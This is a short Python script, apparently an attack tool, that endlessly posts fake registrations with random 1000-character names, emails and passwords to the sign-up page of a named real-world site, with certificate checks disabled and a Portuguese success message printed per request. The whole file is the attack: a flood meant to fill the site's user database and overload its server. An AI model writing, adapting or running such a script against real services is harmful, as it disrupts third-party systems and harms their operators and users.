import requests
from random import choice
from string import ascii_lowercase

url = 'https://www.minemarket.com.br/register/'

lis=list(ascii_lowercase)

while(1):
    ii = ''.join(choice(lis) for _ in range(1000))
    requests.post(url, allow_redirects=False, verify=False, data={
        'name': ii,
        'mail': ii+'@'+'whit3own4.com',
        'pass': ii,
        'register': ''
    })
    print("Pacote com sucesso: %.15s"%ii);
